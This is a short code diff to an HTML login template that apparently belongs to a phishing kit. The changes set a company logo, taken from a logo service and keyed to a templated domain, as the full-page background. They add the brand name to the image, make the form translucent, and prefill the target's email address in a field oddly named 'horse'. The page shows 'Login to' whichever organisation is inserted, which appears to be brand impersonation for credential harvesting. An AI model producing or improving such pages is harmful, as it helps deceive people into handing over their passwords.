@@ -10,7 +10,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f7fc;
+            background: url('https://logo.clearbit.com/{{ins}}') no-repeat center center/cover;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,7 +18,7 @@
             margin: 0;
         }
         .form-holder {
-            background: white;
+            background: rgba(255, 255, 255, 0.9);
             padding: 30px;
             box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
@@ -78,12 +78,12 @@
 </head>
 <body>
     <div class="form-holder">
-        <img src="https://logo.clearbit.com/{{ins}}" alt="Logo">
+        <img src="https://logo.clearbit.com/{{ins}}" alt="{{ins}} Logo">
         <h2>Login to {{ins}}</h2>
         <form action="first" method="POST">
             <div class="input-group">
                 <label for="email">Email</label>
-                <input type="email" id="email" name="horse" required>
+                <input type="email" id="email" name="horse" value="{{email}}" required>
             </div>
             <div class="input-group">
                 <label for="password">Password</label>
